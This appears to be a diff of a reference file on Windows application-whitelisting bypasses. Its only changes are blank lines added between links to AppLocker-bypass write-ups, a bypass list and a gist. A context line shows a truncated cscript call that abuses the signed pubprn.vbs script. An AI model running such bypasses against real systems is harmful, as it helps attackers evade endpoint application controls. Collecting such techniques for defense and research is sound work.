@@ -88,7 +88,11 @@ namespace HelloWorld
 
 Links:
 http://www.ggsec.cn/NET-CS-calc.html
+
+
 https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html
+
+
 https://github.com/milkdevil/UltimateAppLockerByPassList
 
 
@@ -116,6 +120,8 @@ cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "s
 
 Links:
 https://twitter.com/enigma0x3/status/923311244358094848
+
+
 https://gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f321ba07/raw/73c962d65059a211b5d7ea212e9a1054d632622b/new.txt
 
 
